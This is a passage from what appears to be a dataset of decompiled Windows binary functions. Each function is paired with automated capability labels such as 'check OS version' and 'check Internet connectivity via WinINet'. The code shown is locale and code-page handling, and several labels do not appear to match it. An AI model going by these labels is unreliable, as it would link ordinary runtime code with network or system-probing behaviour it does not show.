0x80) != 0) && (1 < *puVar4)) {\n                            puVar12 = puVar12 + 1;\n                            if (*puVar12 == 0) break;\n                            **ppuVar5 = uVar1;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                        **ppuVar5 = *puVar12;\n                        *ppuVar5 = *ppuVar5 + 1;\n                        *puVar4 = *puVar4 - 1;\n                    }\n                    else {\n                        while( true ) {\n                            uVar1 = *puVar12;\n                            if ((uVar1 == 0) || (*puVar4 == 0)) break;\n                            if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < *puVar4)) {\n                                puVar12 = puVar12 + 1;\n                                if (*puVar12 == 0) goto code_r0x0041cfc7;\n                                **ppuVar5 = uVar1;\n                                *ppuVar5 = *ppuVar5 + 1;\n                                *puVar4 = *puVar4 - 1;\n                            }\n                            **ppuVar5 = *puVar12;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            puVar12 = puVar12 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                    }\n                }\n                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x24);\n            }\ncode_r0x0041d2eb:\n            cVar11 = **(unaff_EBP + -0x20);\n            if (cVar11 == '\\0') break;\n            puVar15 = *(unaff_EBP + 0x10);\n        }\n    }\ncode_r0x0041cfc7:\n    *(unaff_EBP + -0x58) = 0x41cfcf;\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 4059
    },
    "0041d2fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0041d2fd(int32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint8_t *arg_14h, uint arg_18h, uint32_t arg_1ch)\n\n{\n    uint8_t uVar1;\n    int32_t arg_10h_00;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    uint var_4h;\n    \n    arg_10h_00 = arg_1ch;\n    if (arg_1ch == 0) {\n        arg_10h_00 = *(arg_8h + 0x4c);\n    }\n    if (arg_10h != 0) {\n        arg_1ch = arg_10h;\n        if (arg_10h == 0) {\ncode_r0x0041d3ac:\n            bVar4 = arg_1ch == 0;\n        }\n        else {\n            do {\n                uVar1 = *arg_14h;\n                if (uVar1 == 0) break;\n                if (uVar1 == 0x25) {\n                    puVar3 = arg_14h + 1;\n                    uVar1 = *puVar3;\n                    if (uVar1 == 0x23) {\n                        puVar3 = arg_14h + 2;\n                    }\n                    iVar2 = fcn.0041cc0d(arg_8h, arg_18h, arg_10h_00, uVar1 == 0x23);\n                    if (iVar2 == 0) goto code_r0x0041d3ac;\n                }\n                else {\n                    if (((*(*(arg_8h + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < arg_1ch)) {\n                        arg_14h = arg_14h + 1;\n                        if (*arg_14h == 0) goto code_r0x0041d3ac;\n                        *arg_ch = uVar1;\n                        arg_ch = arg_ch + 1;\n                        arg_1ch = arg_1ch - 1;\n                    }\n                    *arg_ch = *arg_14h;\n                    arg_ch = arg_ch + 1;\n                    arg_1ch = arg_1ch - 1;\n                    puVar3 = arg_14h;\n                }\n                arg_14h = puVar3 + 1;\n            } while (arg_1ch != 0);\n            bVar4 = arg_1ch == 0;\n            if (!bVar4) {\n                *arg_ch = 0;\n                return arg_10h - arg_1ch;\n            }\n        }\n        if (bVar4) {\n            arg_ch = arg_ch + -1;\n        }\n        *arg_ch = 0;\n        arg_10h = 0;\n    }\n    return arg_10h;\n}\n",
        "token_count": 654
    },
    "0041d9fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041d9fd(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *arg_8h;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *arg_14h;\n    uint *puVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*0x4673b8 == 0) && (*0x4673b4 == 0)) {\n        if (((*0x4675a4 != NULL) && (**0x4675a4 == 0)) && (*0x4675a4 != *(*0x46466c + 0x2c))) {\n            fcn.00411031(*0x4675a4);\n            fcn.00411031(*0x4674d4);\n        }\n        *0x4675a8 = NULL;\n        *0x4675a4 = NULL;\n        arg_14h = 0x464cb4;\n        *0x4674d4 = NULL;\n        puVar8 = *0x4674d4;\n        arg_8h = *0x4675a4;\ncode_r0x0041dbaa:\n        *0x4675a4 = arg_8h;\n        *0x4674d4 = puVar8;\n        *0x464924 = **arg_14h;\n        *0x464928 = 1;\n        uVar6 = 0;\n        *0x464ce4 = arg_14h;\n    }\n    else {\n        arg_14h = fcn.004136f2(1, 0x30);\n        if (arg_14h != NULL) {\n            puVar8 = *0x464ce4;\n            puVar11 = arg_14h;\n            for (iVar7 = 0xc; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar11 = *puVar8;\n                puVar8 = puVar8 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            arg_8h = fcn.0041101f(4);\n            if (arg_8h != NULL) {\n                *arg_8h = 0;\n                if (*0x4673b8 == 0) {\n                    *0x4675a8 = NULL;\n                    *arg_14h = *0x464cb4;\n                    arg_14h[1] = *0x464cb8;\n                    arg_14h[2] = *0x464cbc;\n                }\n                else {\n                    *0x4675a8 = fcn.0041101f(4);\n                    if (*0x4675a8 == NULL) {\n                        uVar6 = 1;\ncode_r0x0041db08:\n                        fcn.00411031(arg_14h);\n                        fcn.00411031(arg_8h);\n                        return uVar6;\n                    }\n                    **0x4675a8 = 0;\n                    uVar9 = *0x467516;\n                    uVar3 = fcn.004205de(1, uVar9, 0xe, arg_14h);\n                    uVar4 = fcn.004205de(1, uVar9, 0xf, arg_14h + 1);\n                    uVar9 = fcn.004205de(1, uVar9, 0x10, arg_14h + 2);\n                    if ((uVar9 | uVar3 | uVar4) != 0) {\n                        fcn.0041d99e(arg_14h);\n                        uVar6 = 0xffffffff;\n                        goto code_r0x0041db08;\n                    }\n                    pcVar5 = arg_14h[2];\n                    while (*pcVar5 != '\\0') {\n                        cVar2 = *pcVar5;\n                        if ((cVar2 < '0') || ('9' < cVar2)) {\n                            pcVar10 = pcVar5;\n                            if (cVar2 != ';') goto code_r0x0041db34;\n                            do {\n                                pcVar1 = pcVar10 + 1;\n                                *pcVar10 = *pcVar1;\n                                pcVar10 = pcVar1;\n                            } while (*pcVar1 != '\\0');\n                        }\n                        else {\n                            *pcVar5 = cVar2 + -0x30;\ncode_r0x0041db34:\n                            pcVar5 = pcVar5 + 1;\n                        }\n                    }\n                }\n                puVar8 = arg_14h;\n                if (((*0x4675a4 != NULL) && (**0x4675a4 == 0)) && (*0x4675a4 != *(*0x46466c + 0x2c))) {\n                    fcn.00411031(*0x4675a4);\n                    fcn.00411031(*0x4674d4);\n                }\n                goto code_r0x0041dbaa;\n            }\n            fcn.00411031(arg_14h);\n        }\n        uVar6 = 1;\n    }\n    return uVar6;\n}\n",
        "token_count": 1173
    },
    "0041dcd6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041dcd6(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    char *pcVar17;\n    uint uVar18;\n    int32_t iVar19;\n    uint32_t uVar20;\n    char *pcVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uint var_4h;\n    \n    if ((*0x4673b4 == 0) && (*0x4673b8 == 0)) {\n        *0x4675a0 = NULL;\n        *0x4675a4 = NULL;\n        *0x464ce4 = 0x464cb4;\n        *0x4674d4 = NULL;\ncode_r0x0041df0e:\n        uVar18 = 0;\n    }\n    else {\n        arg_8h = fcn.004136f2(1, 0x30);\n        if (arg_8h != NULL) {\n            arg_8h_00 = fcn.0041101f(4);\n            if (arg_8h_00 == NULL) {\n                fcn.00411031(arg_8h);\n            }\n            else {\n                *arg_8h_00 = 0;\n                if (*0x4673b4 == 0) {\n                    puVar22 = 0x464cb4;\n                    puVar23 = arg_8h;\n                    for (iVar19 = 0xc; iVar19 != 0; iVar19 = iVar19 + -1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + 1;\n                        puVar23 = puVar23 + 1;\n                    }\n                    *0x4675a0 = NULL;\ncode_r0x0041dedb:\n                    *arg_8h = **0x464ce4;\n                    arg_8h[1] = (*0x464ce4)[1];\n                    arg_8h[2] = (*0x464ce4)[2];\n                    *0x464ce4 = arg_8h;\n                    *0x4674d4 = arg_8h;\n                    *0x4675a4 = arg_8h_00;\n                    goto code_r0x0041df0e;\n                }\n                *0x4675a0 = fcn.0041101f(4);\n                if (*0x4675a0 == NULL) {\n                    fcn.00411031(arg_8h);\n                    fcn.00411031(arg_8h_00);\n                }\n                else {\n                    **0x4675a0 = 0;\n                    uVar20 = *0x467510;\n                    uVar3 = fcn.004205de(1, uVar20, 0x15, arg_8h + 3);\n                    uVar4 = fcn.004205de(1, uVar20, 0x14, arg_8h + 4);\n                    uVar5 = fcn.004205de(1, uVar20, 0x16, arg_8h + 5);\n                    uVar6 = fcn.004205de(1, uVar20, 0x17, arg_8h + 6);\n                    uVar7 = fcn.004205de(1, uVar20, 0x18, arg_8h + 7);\n                    uVar8 = fcn.004205de(1, uVar20, 0x50, arg_8h + 8);\n                    uVar9 = fcn.004205de(1, uVar20, 0x51, arg_8h + 9);\n                    uVar10 = fcn.004205de(0, uVar20, 0x1a, arg_8h + 10);\n                    uVar11 = fcn.004205de(0, uVar20, 0x19, arg_8h + 0x29);\n                    uVar12 = fcn.004205de(0, uVar20, 0x54, arg_8h + 0x2a);\n                    uVar13 = fcn.004205de(0, uVar20, 0x55, arg_8h + 0x2b);\n                    uVar14 = fcn.004205de(0, uVar20, 0x56, arg_8h + 0xb);\n                    uVar15 = fcn.004205de(0, uVar20, 0x57, arg_8h + 0x2d);\n                    uVar16 = fcn.004205de(0, uVar20, 0x52, arg_8h + 0x2e);\n                    uVar20 = fcn.004205de(0, uVar20, 0x53, arg_8h + 0x2f);\n                    if ((uVar20 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 |\n                                  uVar13 | uVar14 | uVar15 | uVar16) == 0) {\n                        pcVar17 = arg_8h[7];\n                        while (*pcVar17 != '\\0') {\n                            cVar2 = *pcVar17;\n                            if ((cVar2 < '0') || ('9' < cVar2)) {\n                                pcVar21 = pcVar17;\n                                if (cVar2 != ';') goto code_r0x0041dea9;\n                                do {\n                                    pcVar1 = pcVar21 + 1;\n                                    *pcVar21 = *pcVar1;\n                                    pcVar21 = pcVar1;\n                                } while (*pcVar1 != '\\0');\n                            }\n                            else {\n                                *pcVar17 = cVar2 + -0x30;\ncode_r0x0041dea9:\n                                pcVar17 = pcVar17 + 1;\n                            }\n                        }\n                        goto code_r0x0041dedb;\n                    }\n                    fcn.0041dbfd(arg_8h);\n                    fcn.00411031(arg_8h);\n                    fcn.00411031(arg_8h_00);\n                }\n            }\n        }\n        uVar18 = 1;\n    }\n    return uVar18;\n}\n",
        "token_count": 1514
    },
    "0041df15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_12h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041df15(void)\n\n{\n    uint8_t *puVar1;\n    char16_t *noname_3;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    ushort *puVar6;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uchar auStack24 [2];\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    var_1ch = 0;\n    if (*0x4673b0 == 0) {\n        *0x46495c = \n        L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x81\\x81\\x81\\x81\\x81\\x81\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x10\\x10\\x10\\x10\\x10\\x10\\x82\\x82\\x82\\x82\\x82\\x82\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x10\\x10\\x10\\x10 \"\n        ;\n        *0x46759c = NULL;\n        *0x467598 = NULL;\n        goto code_r0x0041e0f4;\n    }\n    if ((*0x4673c0 == 0) && (iVar3 = fcn.004205de(0, *0x467508, 0x1004, 0x4673c0),  iVar3 != 0)) {\ncode_r0x0041e0c7:\n        fcn.00411031(var_20h);\n        fcn.00411031(var_24h);\n    }\n    else {\n        var_20h = fcn.0041101f(4);\n        var_24h = fcn.0041101f(0x300);\n        var_1ch = fcn.0041101f(0x101);\n        if ((var_20h == NULL) || ((var_24h == 0 || (var_1ch == 0)))) goto code_r0x0041e0c7;\n        *var_20h = 0;\n        iVar3 = 0;\n        do {\n            *(iVar3 + var_1ch) = iVar3;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x100);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(*0x4673c0, &var_18h);\n        if ((iVar3 == 0) || (5 < var_18h)) goto code_r0x0041e0c7;\n        *0x464920 = var_18h & 0xffff;\n        if ((1 < *0x464920) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                uVar2 = *puVar4;\n                if (uVar2 == 0) break;\n                for (uVar5 = puVar4[-1]; uVar5 <= uVar2; uVar5 = uVar5 + 1) {\n                    *(uVar5 + var_1ch) = 0;\n                    uVar2 = *puVar4;\n                }\n                puVar1 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar1 != 0);\n        }\n        noname_3 = var_24h + 0x100;\n        iVar3 = fcn.0041a164(1, var_1ch, 0x100, noname_3, 0, 0, 0, unaff_ESI, unaff_EBX, unaff_EDI, noname_3, var_20h, \n                             var_1ch, var_18h, _auStack24);\n        if (iVar3 == 0) goto code_r0x0041e0c7;\n        *(var_24h + 0xfe) = 0;\n        if ((1 < *0x464920) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                if (*puVar4 == 0) break;\n                uVar5 = puVar4[-1];\n                if (uVar5 <= *puVar4) {\n                    puVar6 = var_24h + 0x100 + uVar5 * 2;\n                    do {\n                        *puVar6 = 0x8000;\n                        uVar5 = uVar5 + 1;\n                        puVar6 = puVar6 + 1;\n                    } while (uVar5 <= *puVar4);\n                }\n                puVar1 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar1 != 0);\n        }\n        fcn.00411970(var_24h, var_24h + 0x200, 0xfe);\n        *0x46495c = noname_3;\n        *0x467598 = var_24h + 0xfe;\n        *0x46759c = var_20h;\n    }\n    fcn.00411031(var_1ch);\ncode_r0x0041e0f4:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1421
    },
    "0041e1cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e1cd(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    if ((param_1 == NULL) || (*param_1 == '\\0')) {\ncode_r0x0041e213:\n        uVar2 = 0x1004;\ncode_r0x0041e21e:\n        iVar1 = (**0x4674f8)(*0x4674e0, uVar2, &var_ch, 8);\n        if (iVar1 == 0) goto code_r0x0041e238;\n        param_1 = &var_ch;\n    }\n    else {\n        iVar1 = fcn.00418650(param_1, 0x457dc0);\n        if (iVar1 == 0) goto code_r0x0041e213;\n        iVar1 = fcn.00418650(param_1, 0x457dbc);\n        if (iVar1 == 0) {\n            uVar2 = 0xb;\n            goto code_r0x0041e21e;\n        }\n    }\n    fcn.004127bc(param_1);\ncode_r0x0041e238:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 299
    },
    "0041e261": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e261(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    iVar5 = 0;\n    iVar6 = 0x1a;\n    do {\n        iVar2 = (iVar6 + iVar5) / 2;\n        uVar1 = *(iVar2 * 0x2c + 0x456fc0);\n        if (arg_8h == uVar1) {\n            if (arg_ch == 1) {\n                pcVar4 = \"040a\" + iVar2 * 0x2c;\n            }\n            else if (arg_ch == 3) {\n                pcVar4 = iVar2 * 0x2c + 0x456fd0;\n            }\n            else if (arg_ch == 7) {\n                pcVar4 = iVar2 * 0x2c + 0x456fd8;\n            }\n            else if (arg_ch == 0xb) {\n                pcVar4 = iVar2 * 0x2c + 0x456fdc;\n            }\n            else if (arg_ch == 0x1001) {\n                pcVar4 = *(iVar2 * 0x2c + 0x456fcc);\n            }\n            else if (arg_ch == 0x1002) {\n                pcVar4 = *(iVar2 * 0x2c + 0x456fd4);\n            }\n            else {\n                if (arg_ch != 0x1004) break;\n                pcVar4 = iVar2 * 0x2c + 0x456fe4;\n            }\n            if ((pcVar4 != NULL) && (0 < arg_14h)) {\n                fcn.0041c4a0(arg_10h, pcVar4, arg_14h + -1);\n                *(arg_10h + -1 + arg_14h) = 0;\n                return 1;\n            }\n            break;\n        }\n        if (arg_8h < uVar1) {\n            iVar6 = iVar2 + -1;\n        }\n        else {\n            iVar5 = iVar2 + 1;\n        }\n    } while (iVar5 <= iVar6);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 573
    },
    "0041e42a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e42a(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    iVar1 = (**0x4674f8)(arg_8h & 0x3ff | 0x400, 1, &var_7ch, 0x78);\n    if (((iVar1 != 0) && (uVar2 = fcn.0041e344(),  arg_8h != uVar2)) && (arg_ch != 0)) {\n        fcn.00411cb0(*0x4674f4);\n        fcn.0041e379();\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 195
    },
    "0041e6b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e6b5(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    arg_8h_00 = fcn.0041e344();\n    iVar1 = (**0x4674f8)(arg_8h_00, (-(*0x4674e4 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n    if (iVar1 == 0) {\n        *0x4674d8 = 0;\n        goto code_r0x0041e773;\n    }\n    iVar1 = fcn.00420705(*0x4674f4, &var_7ch);\n    if (iVar1 == 0) {\n        if (*0x4674e4 == 0) {\n            iVar1 = 1;\n            goto code_r0x0041e747;\n        }\n    }\n    else {\n        if (((*0x4674e4 != 0) || (*0x4674f0 == 0)) ||\n           (iVar1 = fcn.0042076e(*0x4674f4, &var_7ch, *0x4674f0),  iVar1 != 0)) goto code_r0x0041e773;\ncode_r0x0041e747:\n        iVar1 = fcn.0041e42a(arg_8h_00, iVar1);\n        if (iVar1 == 0) goto code_r0x0041e773;\n    }\n    *0x4674d8 = *0x4674d8 | 4;\n    *0x4674dc = arg_8h_00;\n    *0x4674e0 = arg_8h_00;\ncode_r0x0041e773:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 448
    },
    "0041e892": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0041e892(char *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    uint uVar2;\n    int16_t *unaff_EBX;\n    int32_t unaff_retaddr;\n    \n    if (*0x4674f8 == NULL) {\n        if (*0x467088 == 2) {\n            *0x4674f8 = _sym.imp.KERNEL32.dll_GetLocaleInfoA;\n        }\n        else {\n            *0x4674f8 = fcn.0041e261;\n        }\n    }\n    if (param_1 == NULL) {\ncode_r0x0041e96c:\n        fcn.0041e1b3();\ncode_r0x0041e971:\n        if (*0x4674d8 == 0) {\n            return 0;\n        }\n    }\n    else {\n        *0x4674ec = param_1 + 0x40;\n        *0x4674f4 = param_1;\n        if ((*0x4674ec != NULL) && (**0x4674ec != '\\0')) {\n            fcn.0041e153(0x4575f0, 0x16, 0x4674ec);\n        }\n        *0x4674d8 = 0;\n        if ((*0x4674f4 == NULL) || (**0x4674f4 == '\\0')) {\n            if ((*0x4674ec == NULL) || (**0x4674ec == '\\0')) goto code_r0x0041e96c;\n            fcn.0041e780();\n            goto code_r0x0041e971;\n        }\n        if ((*0x4674ec == NULL) || (**0x4674ec == '\\0')) {\n            fcn.0041e83d();\n        }\n        else {\n            fcn.0041e7b7();\n        }\n        if (*0x4674d8 == 0) {\n            iVar1 = fcn.0041e153(0x4577a0, 0x40, 0x4674f4);\n            if (iVar1 != 0) {\n                if ((*0x4674ec == NULL) || (**0x4674ec == '\\0')) {\n                    fcn.0041e83d();\n                }\n                else {\n                    fcn.0041e7b7();\n                }\n            }\n            goto code_r0x0041e971;\n        }\n    }\n    arg_8h = fcn.0041e1cd();\n    if (((arg_8h == 0) || (iVar1 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h & 0xffff),  iVar1 == 0)) ||\n       (iVar1 = (*_sym.imp.KERNEL32.dll_IsValidLocale)(*0x4674dc, 1),  uVar2 = *0x4674dc,  iVar1 == 0)) {\ncode_r0x0041ea41:\n        uVar2 = 0;\n    }\n    else {\n        if (unaff_EBX != NULL) {\n            *unaff_EBX = *0x4674dc;\n            unaff_EBX[1] = *0x4674e0;\n            unaff_EBX[2] = arg_8h;\n        }\n        if (unaff_retaddr != 0) {\n            if (*unaff_EBX == 0x814) {\n                fcn.004190f0(unaff_retaddr, \"Norwegian-Nynorsk\");\n            }\n            else {\n                iVar1 = (**0x4674f8)(uVar2, 0x1001, unaff_retaddr, 0x40);\n                if (iVar1 == 0) goto code_r0x0041ea41;\n            }\n            iVar1 = (**0x4674f8)(*0x4674e0, 0x1002, unaff_retaddr + 0x40, 0x40);\n            if (iVar1 == 0) goto code_r0x0041ea41;\n            fcn.0042082b(arg_8h, unaff_retaddr + 0x80, 10);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 941
    },
    "0041eacc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.0041eacc(uint noname_0, uint noname_1, uint lpMultiByteStr, uint arg_14h_2, uint arg_8h, uint arg_ch, uint noname_6\n            , uint arg_14h)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uchar *arg_ch_00;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    uint CodePage;\n    uint var_4h;\n    uint var_48h_2;\n    uint var_54h;\n    uint cbMultiByte;\n    uint var_3ch_2;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x38;\n    var_4h_2 = 0x457dd8;\n    var_18h = 0x41ead8;\n    fcn.00412580();\n    *(unaff_EBP + -0x1c) = *0x4640c8;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    puVar1 = **(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x40) = puVar1;\n    *(unaff_EBP + -0x3c) = 0;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCPInfo;\n    if (*(unaff_EBP + 8) == *(unaff_EBP + 0xc)) {\n        arg_8h_00 = *(unaff_EBP + -0x48);\n    }\n    else {\n        var_18h = unaff_EBP + -0x30;\n        var_1ch = *(unaff_EBP + 8);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n        if ((((iVar3 != 0) && (*(unaff_EBP + -0x30) == 1)) &&\n            (iVar3 = (*pcVar2)(*(unaff_EBP + 0xc), unaff_EBP + -0x30),  iVar3 != 0)) && (*(unaff_EBP + -0x30) == 1)) {\n            *(unaff_EBP + -0x3c) = 1;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            arg_ch_00 = *(unaff_EBP + -0x38);\n        }\n        else {\n            arg_ch_00 = puVar1;\n            if (puVar1 == 0xffffffff) {\n                iVar3 = fcn.00411cb0(*(unaff_EBP + 0x10));\n                arg_ch_00 = iVar3 + 1;\n            }\n            *(unaff_EBP + -0x38) = arg_ch_00;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            arg_ch_00 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), puVar1, 0, 0);\n            *(unaff_EBP + -0x38) = arg_ch_00;\n            if (arg_ch_00 == NULL) goto code_r0x0041ec84;\n        }\n        arg_8h_00 = &fcn.0041eacc::var_1ch;\n        *(unaff_EBP + -4) = 0;\n        fcn.004112a0();\n        *(unaff_EBP + -0x18) = &fcn.0041eacc::var_1ch;\n        *(unaff_EBP + -0x48) = &fcn.0041eacc::var_1ch;\n        fcn.00411850(&fcn.0041eacc::var_1ch, 0, arg_ch_00 * 2);\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*0x10 == 0x10) {\n            arg_8h_00 = fcn.004136f2(2, arg_ch_00);\n            if (arg_8h_00 == NULL) goto code_r0x0041ec84;\n            *(unaff_EBP + -0x44) = 1;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), *(unaff_EBP + -0x40), arg_8h_00, arg_ch_00);\n        if (iVar3 != 0) {\n            if (*(unaff_EBP + 0x18) == 0) {\n                if (*(unaff_EBP + -0x3c) == 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    arg_ch_00 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                          (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, 0, 0);\n                    if (arg_ch_00 == NULL) goto code_r0x0041ec75;\n                }\n                var_1ch = 1;\n                var_18h = arg_ch_00;\n        